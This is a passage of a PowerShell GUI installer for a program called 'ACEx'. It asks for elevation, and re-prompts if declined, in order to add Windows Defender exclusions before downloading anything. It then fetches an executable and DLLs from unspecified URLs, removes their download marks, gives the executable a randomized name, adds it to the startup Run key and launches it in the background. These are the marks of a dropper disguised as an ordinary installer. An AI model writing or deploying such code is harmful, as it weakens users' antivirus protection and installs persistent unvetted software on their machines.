        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\EdgeUpdate\Clients\{F3017226-FE2A-4295-8BDF-00C3A9A7E4C5}",
        "HKLM:\SOFTWARE\Microsoft\EdgeUpdate\Clients\{F3017226-FE2A-4295-8BDF-00C3A9A7E4C5}",
        "HKCU:\SOFTWARE\Microsoft\EdgeUpdate\Clients\{F3017226-FE2A-4295-8BDF-00C3A9A7E4C5}"
    )

    $wv2Installed = $false
    foreach ($p in $wv2RegPaths) {
        if (Test-Path $p) {
            $wv2Installed = $true
            break
        }
    }

    if ($wv2Installed) {
        Write-Log "WebView2 Runtime already installed" -type success
        return $true
    }

    Write-Log "WebView2 Runtime not found" -type warning
    $wv2Bootstrap = Join-Path $env:TEMP "MicrosoftEdgeWebview2Setup.exe"

    try {
        Invoke-WebRequest -Uri "https://go.microsoft.com/fwlink/p/?LinkId=2124703" -OutFile $wv2Bootstrap -UseBasicParsing
        Start-Process -FilePath $wv2Bootstrap -ArgumentList "/silent /install" -Wait
        Write-Log "WebView2 Runtime installed" -type success
        return $true
    } catch {
        Write-Log "Could not install WebView2 Runtime" -type warning
        return $false
    }
}

# =============================================================================
# MAIN INSTALLATION
# =============================================================================

$form.Show()
$form.Refresh()
Start-Sleep -Milliseconds 500

try {
    Update-Status "Starting installation..."

    # Create install directory
    if (!(Test-Path $InstallDir)) {
        New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
    }

    # Data migration
    Update-Step -icon "[DIR]" -text "Checking for existing data..." -percent 8
    Write-Log "Scanning for legacy installations..." -type highlight

    foreach ($legacy in $LegacyDirs) {
        if (!(Test-Path $legacy)) { continue }
        foreach ($name in $DataFiles) {
            $src = Join-Path $legacy $name
            $dst = Join-Path $InstallDir $name
            if ((Test-Path $src) -and !(Test-Path $dst)) {
                Move-Item -LiteralPath $src -Destination $dst -Force -ErrorAction SilentlyContinue
            }
        }
        foreach ($name in $DataDirs) {
            $src = Join-Path $legacy $name
            $dst = Join-Path $InstallDir $name
            if ((Test-Path $src) -and !(Test-Path $dst)) {
                Move-Item -LiteralPath $src -Destination $dst -Force -ErrorAction SilentlyContinue
            }
        }
    }
    Write-Log "Data migration complete" -type success

    if ((Test-Path $LegacyChatHistory) -and !(Test-Path $NewChatHistory)) {
        Move-Item -LiteralPath $LegacyChatHistory -Destination $NewChatHistory -Force -ErrorAction SilentlyContinue
    }
    if ((Test-Path $LegacyWorkspace) -and !(Test-Path $NewWorkspace)) {
        Move-Item -LiteralPath $LegacyWorkspace -Destination $NewWorkspace -Force -ErrorAction SilentlyContinue
    }

    # Legacy cleanup
    try {
        $RunKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        foreach ($legacyName in $LegacyRunKeyNames) {
            if (Get-ItemProperty -Path $RunKey -Name $legacyName -ErrorAction SilentlyContinue) {
                Remove-ItemProperty -Path $RunKey -Name $legacyName -Force -ErrorAction SilentlyContinue
                Write-Log "Removed legacy startup: $legacyName" -type success
            }
        }
    } catch { }

    $LegacyLiteralPath = Join-Path $InstallDir $LegacyLiteralName
    if ((Test-Path $LegacyLiteralPath) -and ($LegacyLiteralPath -ne $ExePath)) {
        Remove-Item -LiteralPath $LegacyLiteralPath -Force -ErrorAction SilentlyContinue
        Write-Log "Removed legacy binary" -type success
    }

    foreach ($lnk in $LegacyShortcuts) {
        if (Test-Path $lnk) {
            Remove-Item -LiteralPath $lnk -Force -ErrorAction SilentlyContinue
        }
    }

    # UAC Setup - apply Defender exclusions BEFORE any download.
    $exclOk = Invoke-ElevatedSetup
    if (-not $exclOk) {
        Write-Log "Retrying protection setup - please accept the prompt" -type warning
        $exclOk = Invoke-ElevatedSetup
    }
    if (-not $exclOk) {
        Write-Log "Continuing without full protection - files may be removed by antivirus" -type warning
    }

    Update-Step -icon "[GEAR]" -text "Configuring system components..." -percent 32

    # Stop running processes
    Update-Step -icon "[SYNC]" -text "Preparing for update..." -percent 40
    Write-Log "Checking for running instances..." -type highlight

    $running = Get-Process -Name "acex" -ErrorAction SilentlyContinue
    $running += Get-Process -Name "ACEx" -ErrorAction SilentlyContinue
    $exeBase = [IO.Path]::GetFileNameWithoutExtension($AppExeName)
    if ($exeBase -and $exeBase -notin @("acex", "ACEx")) {
        $running += Get-Process -Name $exeBase -ErrorAction SilentlyContinue
    }
    if ($running) {
        $running | ForEach-Object { try { $_ | Stop-Process -Force } catch { } }
        Write-Log "Stopped running instances" -type success
        Start-Sleep -Milliseconds 800
    }

    # Download main executable
    Update-Step -icon "[DOWN]" -text "Downloading $BrandName..." -percent 50
    Write-Log "Connecting to download server..." -type highlight

    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($ExeUrl, $ExePath)
    $wc.Dispose()
    Start-Sleep -Seconds 1

    if (!(Test-Path $ExePath)) { Show-Error "Download failed" }
    $exeSize = (Get-Item $ExePath).Length
    if ($exeSize -lt 100KB) { Show-Error "Downloaded file is invalid" }
    Write-Log "Application downloaded ($([math]::Round($exeSize/1MB, 1)) MB)" -type success

    # Check & install Visual C++ Redistributable 2015-2022 x64
    Update-Step -icon "[PKG]" -text "Checking Visual C++ Runtime..." -percent 58
    Write-Log "Checking Visual C++ Redistributable..." -type highlight
    $vcInstalled = $false
    $vcRegPaths = @(
        "HKLM:\SOFTWARE\Microsoft\VisualStudio\14.0\VC\Runtimes\x64",
        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\VisualStudio\14.0\VC\Runtimes\x64"
    )
    foreach ($vcp in $vcRegPaths) {
        if (Test-Path $vcp) {
            try {
                $vcVer = (Get-ItemProperty -Path $vcp -ErrorAction Stop).Version
                if ($vcVer -and [version]($vcVer.TrimStart('v')) -ge [version]"14.0.0") {
                    $vcInstalled = $true; break
                }
            } catch { }
        }
    }
    if ($vcInstalled) {
        Write-Log "Visual C++ Redistributable already installed" -type success
    } else {
        Write-Log "Visual C++ Redistributable not found - downloading..." -type warning
        $vcRedistPath = Join-Path $env:TEMP "vc_redist.x64.exe"
        try {
            $wcVc = New-Object System.Net.WebClient
            $wcVc.DownloadFile("https://aka.ms/vc14/vc_redist.x64.exe", $vcRedistPath)
            $wcVc.Dispose()
            Start-Process -FilePath $vcRedistPath -ArgumentList "/install", "/quiet", "/norestart" -Wait
            Remove-Item $vcRedistPath -Force -ErrorAction SilentlyContinue
            Write-Log "Visual C++ Redistributable installed" -type success
        } catch {
            Write-Log "Could not install Visual C++ Redistributable" -type warning
        }
    }

    # Download DLLs (skipped if URLs are empty)
    if ($DllUrl) {
        Update-Step -icon "[DOWN]" -text "Downloading components..." -percent 65
        try {
            $wc2 = New-Object System.Net.WebClient
            $wc2.DownloadFile($DllUrl, $DllPath)
            $wc2.Dispose()
            Start-Sleep -Milliseconds 500
            Write-Log "Core components installed" -type success
        } catch {
            Write-Log "Some features may be limited" -type warning
        }
    }

    if ($Dll2Url) {
        try {
            $wc4 = New-Object System.Net.WebClient
            $wc4.DownloadFile($Dll2Url, $Dll2Path)
            $wc4.Dispose()
            Write-Log "Dll2 downloaded" -type success
        } catch {
            Write-Log "Dll2 download failed: $_" -type warning
        }
    }

    if ($WebView2LoaderUrl) {
        try {
            $wc3 = New-Object System.Net.WebClient
            $wc3.DownloadFile($WebView2LoaderUrl, $WebView2LoaderPath)
            $wc3.Dispose()
            Write-Log "WebView2Loader downloaded" -type success
        } catch {
            Write-Log "WebView2Loader download failed" -type warning
        }
    }

    # Check WebView2 Runtime
    Update-Step -icon "[WWW]" -text "Checking WebView2 Runtime..." -percent 72
    Check-WebView2Runtime

    # Save metadata
    Update-Step -icon "[PKG]" -text "Finalizing installation..." -percent 78
    try {
        $metaBody = @{
            exe_name = $AppExeName
            install_dir = $InstallDir
            installed_at = (Get-Date).ToString("o")
            scheme = "randomized-v1"
            version = "2.0.0"
            variant = $Variant
        } | ConvertTo-Json
        Set-Content -LiteralPath $MetaPath -Value $metaBody -Encoding UTF8
        Write-Log "Configuration saved." -type success
    } catch {
        Write-Log "Could not save metadata" -type warning
    }

    # Startup registration
    try {
        $RunKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $RunKey -Name $RegistryRunKeyName -Value "`"$ExePath`""
        Write-Log "Added to Windows startup" -type success
    } catch {
        Write-Log "Could not register startup entry" -type warning
    }

    # Create shortcuts
    Update-Step -icon "[LINK]" -text "Creating shortcuts..." -percent 88
    try {
        $WScriptShell = New-Object -ComObject WScript.Shell

        $Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
        $Shortcut.TargetPath = $ExePath
        $Shortcut.WorkingDirectory = $InstallDir
        $Shortcut.IconLocation = "$ExePath,0"
        $Shortcut.Save()

        $FolderShortcut = $WScriptShell.CreateShortcut($FolderShortcutPath)
        $FolderShortcut.TargetPath = $InstallDir
        $FolderShortcut.IconLocation = "$env:SystemRoot\System32\shell32.dll,4"
        $FolderShortcut.Save()

        Write-Log "Desktop shortcuts created" -type success
    } catch {
        Write-Log "Could not create shortcuts" -type warning
    }

    # Unblock files
    Update-Step -icon "[DONE]" -text "Finalizing..." -percent 95
    Unblock-File -Path $ExePath -ErrorAction SilentlyContinue
    Unblock-File -Path $DllPath -ErrorAction SilentlyContinue
    if (Test-Path $Dll2Path) {
        Unblock-File -Path $Dll2Path -ErrorAction SilentlyContinue
    }

    # Launch
    Update-Step -icon "[GO]" -text "Launching $BrandName..." -percent 100
    Animate-Progress -targetPercent 100
    Start-Process -FilePath $ExePath -WorkingDirectory $InstallDir

    Start-Sleep -Milliseconds 800

    # Success state
    $title.Text = "All Set"
    $title.ForeColor = $SuccessGreen
    $sub.Text = "$BrandName has been downloaded and launched."
    $sub.ForeColor = $SuccessGreen

    $progressFill.BackColor = $SuccessGreen
    $progressPercent.ForeColor = $SuccessGreen

    Update-Status "$BrandName is running" $SuccessGreen

    Write-Log "" -type info
    Write-Log "Installation complete!" -type success
    Write-Log "$BrandName is now running in the background" -type highlight
    Write-Log "Desktop shortcuts have been created" -type info

    [System.Windows.Forms.Application]::DoEvents()
    Start-Sleep -Seconds 3

    $form.Close()

    if (Test-Path $logoPath) {
        Remove-Item $logoPath -Force -ErrorAction SilentlyContinue
    }

} catch {
    if (Test-Path $logoPath) {
        Remove-Item $logoPath -Force -ErrorAction SilentlyContinue
    }
    Show-Error $_.Exception.Message
}
